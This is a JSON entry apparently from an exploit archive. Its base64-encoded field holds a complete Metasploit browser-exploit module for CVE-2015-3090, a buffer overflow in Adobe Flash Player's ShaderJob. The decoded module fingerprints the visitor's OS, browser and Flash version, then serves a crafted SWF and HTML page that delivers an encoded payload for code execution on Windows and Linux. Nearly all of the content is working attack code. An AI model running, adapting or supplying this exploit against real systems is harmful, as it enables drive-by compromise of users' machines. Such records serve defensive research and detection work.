{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cDovL21ldGFzcGxvaXQuY29tL2Rvd25sb2FkDQojIEN1cnJlbnQgc291cmNlOiBodHRwczovL2dpdGh1Yi5jb20vcmFwaWQ3L21ldGFzcGxvaXQtZnJhbWV3b3JrDQojIw0KDQpyZXF1aXJlICdtc2YvY29yZScNCg0KY2xhc3MgTWV0YXNwbG9pdDMgPCBNc2Y6OkV4cGxvaXQ6OlJlbW90ZQ0KICBSYW5rID0gR3JlYXRSYW5raW5nDQoNCiAgaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OlJlbW90ZTo6QnJvd3NlckV4cGxvaXRTZXJ2ZXINCg0KICBkZWYgaW5pdGlhbGl6ZShpbmZvPXt9KQ0KICAgIHN1cGVyKHVwZGF0ZV9pbmZvKGluZm8sDQogICAgICAnTmFtZScgICAgICAgICAgICAgICAgPT4gJ0Fkb2JlIEZsYXNoIFBsYXllciBTaGFkZXJKb2IgQnVmZmVyIE92ZXJmbG93JywNCiAgICAgICdEZXNjcmlwdGlvbicgICAgICAgICA9PiAlcXsNCiAgICAgICAgVGhpcyBtb2R1bGUgZXhwbG9pdHMgYSBidWZmZXIgb3ZlcmZsb3cgdnVsbmVyYWJpbGl0eSByZWxhdGVkIHRvIHRoZSBTaGFkZXJKb2Igd29ya2luZ3Mgb24NCiAgICAgICAgQWRvYmUgRmxhc2ggUGxheWVyLiBUaGUgdnVsbmVyYWJpbGl0eSBoYXBwZW5zIHdoZW4gdHJ5aW5nIHRvIGFwcGx5IGEgU2hhZGVyIHNldHRpbmcgdXAgdGhlDQogICAgICAgIHNhbWUgQml0bWFwIG9iamVjdCBhcyBzcmMgYW5kIGRlc3RpbmF0aW9uIG9mIHRoZSBTaGFkZXJKb2IuIE1vZGlmeWluZyB0aGUgIndpZHRoIiBhdHRyaWJ1dGUNCiAgICAgICAgb2YgdGhlIFNoYWRlckpvYiBhZnRlciBzdGFydGluZyB0aGUgam9iIGl0J3MgcG9zc2libGUgdG8gY3JlYXRlIGEgYnVmZmVyIG92ZXJmbG93IGNvbmRpdGlvbg0KICAgICAgICB3aGVyZSB0aGUgc2l6ZSBvZiB0aGUgZGVzdGluYXRpb24gYnVmZmVyIGFuZCB0aGUgbGVuZ3RoIG9mIHRoZSBjb3B5IGFyZSBjb250cm9sbGVkLiBUaGlzDQogICAgICAgIG1vZHVsZSBoYXMgYmVlbiB0ZXN0ZWQgc3VjY2Vzc2Z1bGx5IG9uOg0KICAgICAgICAqIFdpbmRvd3MgNyBTUDEgKDMyLWJpdCksIElFMTEgYW5kIEFkb2JlIEZsYXNoIDE3LjAuMC4xNjkuDQogICAgICAgICogV2luZG93cyA3IFNQMSAoMzItYml0KSwgRmlyZWZveCAzOC4wLjUgYW5kIEFkb2JlIEZsYXNoIDE3LjAuMC4xNjkuDQogICAgICAgICogV2luZG93cyA4LjEsIEZpcmVmb3ggMzguMC41IGFuZCBBZG9iZSBGbGFzaCAxNy4wLjAuMTY5Lg0KICAgICAgICAqIExpbnV4IE1pbnQgIlJlYmVjY2EiICgzMiBiaXRzKSwgRmlyZWZveCAzMy4wIGFuZCBBZG9iZSBGbGFzaCAxMS4yLjIwMi40NTcuDQogICAgICB9LA0KICAgICAgJ0xpY2Vuc2UnICAgICAgICAgICAgID0+IE1TRl9MSUNFTlNFLA0KICAgICAgJ0F1dGhvcicgICAgICAgICAgICAgID0+DQogICAgICAgIFsNCiAgICAgICAgICAnQ2hyaXMgRXZhbnMnLCAjIFZ1bG5lcmFiaWxpdHkgZGlzY292ZXJ5DQogICAgICAgICAgJ1Vua25vd24nLCAjIEV4cGxvaXQgaW4gdGhlIHdpbGQNCiAgICAgICAgICAnanVhbiB2YXpxdWV6JyAjIG1zZiBtb2R1bGUNCiAgICAgICAgXSwNCiAgICAgICdSZWZlcmVuY2VzJyAgICAgICAgICA9Pg0KICAgICAgICBbDQogICAgICAgICAgWydDVkUnLCAnMjAxNS0zMDkwJ10sDQogICAgICAgICAgWydVUkwnLCAnaHR0cHM6Ly9oZWxweC5hZG9iZS5jb20vc2VjdXJpdHkvcHJvZHVjdHMvZmxhc2gtcGxheWVyL2Fwc2IxNS0wOS5odG1sJ10sDQogICAgICAgICAgWydVUkwnLCAnaHR0cHM6Ly93d3cuZmlyZWV5ZS5jb20vYmxvZy90aHJlYXQtcmVzZWFyY2gvMjAxNS8wNS9hbmdsZXJfZWtfZXhwbG9pdGluZy5odG1sJ10sDQogICAgICAgICAgWydVUkwnLCAnaHR0cDovL21hbHdhcmUuZG9udG5lZWRjb2ZmZWUuY29tLzIwMTUvMDUvY3ZlLTIwMTUtMzA5MC1mbGFzaC11cC10by0xNzAwMTY5LWFuZC5odG1sJ10sDQogICAgICAgICAgWydVUkwnLCAnaHR0cDovL3d3dy5icm9va3NhbmRydXMuY29tL2Jsb2cvMjAwOS8wMy8xMS9iaWxpbmVhci1yZXNhbXBsaW5nLXdpdGgtZmxhc2gtcGxheWVyLWFuZC1waXhlbC1iZW5kZXIvJ10NCiAgICAgICAgXSwNCiAgICAgICdQYXlsb2FkJyAgICAgICAgICAgICA9Pg0KICAgICAgICB7DQogICAgICAgICAgJ0Rpc2FibGVOb3BzJyA9PiB0cnVlDQogICAgICAgIH0sDQogICAgICAnUGxhdGZvcm0nICAgICAgICAgICAgPT4gWyd3aW4nLCAnbGludXgnXSwNCiAgICAgICdBcmNoJyAgICAgICAgICAgICAgICA9PiBbQVJDSF9YODZdLA0KICAgICAgJ0Jyb3dzZXJSZXF1aXJlbWVudHMnID0+DQogICAgICAgIHsNCiAgICAgICAgICA6c291cmNlICA9PiAvc2NyaXB0fGhlYWRlcnMvaSwNCiAgICAgICAgICA6YXJjaCAgICA9PiBBUkNIX1g4NiwNCiAgICAgICAgICA6b3NfbmFtZSA9PiBsYW1iZGEgZG8gfG9zfA0KICAgICAgICAgICAgb3MgPX4gT3BlcmF0aW5nU3lzdGVtczo6TWF0Y2g6OkxJTlVYIHx8DQogICAgICAgICAgICAgIG9zID1+IE9wZXJhdGluZ1N5c3RlbXM6Ok1hdGNoOjpXSU5ET1dTXzcgfHwNCiAgICAgICAgICAgICAgb3MgPX4gT3BlcmF0aW5nU3lzdGVtczo6TWF0Y2g6OldJTkRPV1NfODENCiAgICAgICAgICBlbmQsDQogICAgICAgICAgOnVhX25hbWUgPT4gbGFtYmRhIGRvIHx1YXwNCiAgICAgICAgICAgIGNhc2UgdGFyZ2V0Lm5hbWUNCiAgICAgICAgICAgIHdoZW4gJ1dpbmRvd3MnDQogICAgICAgICAgICAgIHJldHVybiB0cnVlIGlmIHVhID09IE1zZjo6SHR0cENsaWVudHM6OklFIHx8IHVhID09IE1zZjo6SHR0cENsaWVudHM6OkZGDQogICAgICAgICAgICB3aGVuICdMaW51eCcNCiAgICAgICAgICAgICAgcmV0dXJuIHRydWUgaWYgdWEgPT0gTXNmOjpIdHRwQ2xpZW50czo6RkYNCiAgICAgICAgICAgIGVuZA0KDQogICAgICAgICAgICBmYWxzZQ0KICAgICAgICAgIGVuZCwNCiAgICAgICAgICA6Zmxhc2ggICA9PiBsYW1iZGEgZG8gfHZlcnwNCiAgICAgICAgICAgIGNhc2UgdGFyZ2V0Lm5hbWUNCiAgICAgICAgICAgIHdoZW4gJ1dpbmRvd3MnDQogICAgICAgICAgICAgIHJldHVybiB0cnVlIGlmIHZlciA9fiAvXjE3XC4vICYmIEdlbTo6VmVyc2lvbi5uZXcodmVyKSA8PSBHZW06OlZlcnNpb24ubmV3KCcxNy4wLjAuMTY5JykNCiAgICAgICAgICAgIHdoZW4gJ0xpbnV4Jw0KICAgICAgICAgICAgICByZXR1cm4gdHJ1ZSBpZiB2ZXIgPX4gL14xMVwuLyAmJiBHZW06OlZlcnNpb24ubmV3KHZlcikgPD0gR2VtOjpWZXJzaW9uLm5ldygnMTEuMi4yMDIuNDU3JykNCiAgICAgICAgICAgIGVuZA0KDQogICAgICAgICAgICBmYWxzZQ0KICAgICAgICAgIGVuZA0KICAgICAgICB9LA0KICAgICAgJ1RhcmdldHMnICAgICAgICAgICAgID0+DQogICAgICAgIFsNCiAgICAgICAgICBbICdXaW5kb3dzJywNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgJ1BsYXRmb3JtJyA9PiAnd2luJw0KICAgICAgICAgICAgfQ0KICAgICAgICAgIF0sDQogICAgICAgICAgWyAnTGludXgnLA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAnUGxhdGZvcm0nID0+ICdsaW51eCcNCiAgICAgICAgICAgIH0NCiAgICAgICAgICBdDQogICAgICAgIF0sDQogICAgICAnUHJpdmlsZWdlZCcgICAgICAgICAgPT4gZmFsc2UsDQogICAgICAnRGlzY2xvc3VyZURhdGUnICAgICAgPT4gJ01heSAxMiAyMDE1JywNCiAgICAgICdEZWZhdWx0VGFyZ2V0JyAgICAgICA9PiAwKSkNCiAgZW5kDQoNCiAgZGVmIGV4cGxvaXQNCiAgICBAc3dmID0gY3JlYXRlX3N3Zg0KDQogICAgc3VwZXINCiAgZW5kDQoNCiAgZGVmIG9uX3JlcXVlc3RfZXhwbG9pdChjbGksIHJlcXVlc3QsIHRhcmdldF9pbmZvKQ0KICAgIHByaW50X3N0YXR1cygiUmVxdWVzdDogI3tyZXF1ZXN0LnVyaX0iKQ0KDQogICAgaWYgcmVxdWVzdC51cmkgPX4gL1wuc3dmJC8NCiAgICAgIHByaW50X3N0YXR1cygnU2VuZGluZyBTV0YuLi4nKQ0KICAgICAgc2VuZF9yZXNwb25zZShjbGksIEBzd2YsIHsnQ29udGVudC1UeXBlJz0+J2FwcGxpY2F0aW9uL3gtc2hvY2t3YXZlLWZsYXNoJywgJ0NhY2hlLUNvbnRyb2wnID0+ICduby1jYWNoZSwgbm8tc3RvcmUnLCAnUHJhZ21hJyA9PiAnbm8tY2FjaGUnfSkNCiAgICAgIHJldHVybg0KICAgIGVuZA0KDQogICAgcHJpbnRfc3RhdHVzKCdTZW5kaW5nIEhUTUwuLi4nKQ0KICAgIHNlbmRfZXhwbG9pdF9odG1sKGNsaSwgZXhwbG9pdF90ZW1wbGF0ZShjbGksIHRhcmdldF9pbmZvKSwgeydQcmFnbWEnID0+ICduby1jYWNoZSd9KQ0KICBlbmQNCg0KICBkZWYgZXhwbG9pdF90ZW1wbGF0ZShjbGksIHRhcmdldF9pbmZvKQ0KICAgIHN3Zl9yYW5kb20gPSAiI3tyYW5kX3RleHRfYWxwaGEoNCArIHJhbmQoMykpfS5zd2YiDQogICAgdGFyZ2V0X3BheWxvYWQgPSBnZXRfcGF5bG9hZChjbGksIHRhcmdldF9pbmZvKQ0KICAgIGI2NF9wYXlsb2FkID0gUmV4OjpUZXh0LmVuY29kZV9iYXNlNjQodGFyZ2V0X3BheWxvYWQpDQogICAgb3NfbmFtZSA9IHRhcmdldF9pbmZvWzpvc19uYW1lXQ0KDQogICAgaWYgdGFyZ2V0Lm5hbWUgPX4gL1dpbmRvd3MvDQogICAgICBwbGF0Zm9ybV9pZCA9ICd3aW4nDQogICAgZWxzaWYgdGFyZ2V0Lm5hbWUgPX4gL0xpbnV4Lw0KICAgICAgcGxhdGZvcm1faWQgPSAnbGludXgnDQogICAgZW5kDQoNCiAgICBodG1sX3RlbXBsYXRlID0gJVF8PGh0bWw+DQogICAgPGJvZHk+DQogICAgPG9iamVjdCBjbGFzc2lkPSJjbHNpZDpkMjdjZGI2ZS1hZTZkLTExY2YtOTZiOC00NDQ1NTM1NDAwMDAiIGNvZGViYXNlPSJodHRwOi8vZG93bmxvYWQubWFjcm9tZWRpYS5jb20vcHViL3Nob2Nrd2F2ZS9jYWJzL2ZsYXNoL3N3Zmxhc2guY2FiIiB3aWR0aD0iMSIgaGVpZ2h0PSIxIiAvPg0KICAgIDxwYXJhbSBuYW1lPSJtb3ZpZSIgdmFsdWU9IjwlPXN3Zl9yYW5kb20lPiIgLz4NCiAgICA8cGFyYW0gbmFtZT0iYWxsb3dTY3JpcHRBY2Nlc3MiIHZhbHVlPSJhbHdheXMiIC8+DQogICAgPHBhcmFtIG5hbWU9IkZsYXNoVmFycyIgdmFsdWU9InNoPTwlPWI2NF9wYXlsb2FkJT4mcGw9PCU9cGxhdGZvcm1faWQlPiZvcz08JT1vc19uYW1lJT4iIC8+DQogICAgPHBhcmFtIG5hbWU9IlBsYXkiIHZhbHVlPSJ0cnVlIiAvPg0KICAgIDxlbWJlZCB0eXBlPSJhcHBsaWNhdGlvbi94LXNob2Nrd2F2ZS1mbGFzaCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgc3JjPSI8JT1zd2ZfcmFuZG9tJT4iIGFsbG93U2NyaXB0QWNjZXNzPSJhbHdheXMiIEZsYXNoVmFycz0ic2g9PCU9YjY0X3BheWxvYWQlPiZwbD08JT1wbGF0Zm9ybV9pZCU+Jm9zPTwlPW9zX25hbWUlPiIgUGxheT0idHJ1ZSIvPg0KICAgIDwvb2JqZWN0Pg0KICAgIDwvYm9keT4NCiAgICA8L2h0bWw+DQogICAgfA0KDQogICAgcmV0dXJuIGh0bWxfdGVtcGxhdGUsIGJpbmRpbmcoKQ0KICBlbmQNCg0KICBkZWYgY3JlYXRlX3N3Zg0KICAgIHBhdGggPSA6OkZpbGUuam9pbihNc2Y6OkNvbmZpZy5kYXRhX2RpcmVjdG9yeSwgJ2V4cGxvaXRzJywgJ0NWRS0yMDE1LTMwOTAnLCAnbXNmLnN3ZicpDQogICAgc3dmID0gIDo6RmlsZS5vcGVuKHBhdGgsICdyYicpIHsgfGZ8IHN3ZiA9IGYucmVhZCB9DQoNCiAgICBzd2YNCiAgZW5kDQplbmQ=", 
    "filename": "platforms/multiple/remote/37368.rb", 
    "id": "37368", 
    "cves": [
        "CVE-2015-3090"
    ]
}